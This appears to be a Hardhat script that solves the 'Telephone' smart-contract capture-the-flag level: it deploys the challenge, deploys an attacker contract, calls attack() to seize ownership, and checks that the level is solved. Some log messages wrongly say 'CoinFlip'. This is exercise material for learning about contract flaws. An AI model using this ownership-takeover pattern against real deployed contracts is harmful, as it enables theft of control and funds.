const { ethers } = require('hardhat');

async function main() {
  const [owner, player] = await ethers.getSigners();
  console.log("\n[0] original owner: ", owner.address);
  console.log("[0] player: ", player.address);

  console.log("\n[1] deploy CoinFlipFactory");
  const Factory = await ethers.getContractFactory("TelephoneFactory");
  const factory = await Factory.deploy();
  await factory.deployed();
  console.log("---- TelephoneFactory address: ", factory.address);

  console.log("\n[2] create a CoinFlip instance");
  const receipt = await factory.connect(player).createInstance(player.address);
  const instance_address = (await receipt.wait()).events[0].args[0];
  const telephone = await ethers.getContractAt("Telephone", instance_address, owner);

  console.log("\n[3] deploy Caller");
  const Caller = await ethers.getContractFactory("TelephoneCaller");
  const caller = await Caller.connect(player).deploy();
  await caller.deployed();
  console.log("---- TelephoneCaller address: ", caller.address);

  console.log("\n[4] call attack()");
  await caller.connect(player).attack(telephone.address, player.address);

  console.log("\n[5] validate solved");
  const res = await factory.validateInstance(telephone.address, player.address);
  if (res == true) {
    console.log("[+] Done!");
  } else {
    console.log("[+] Fail...");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

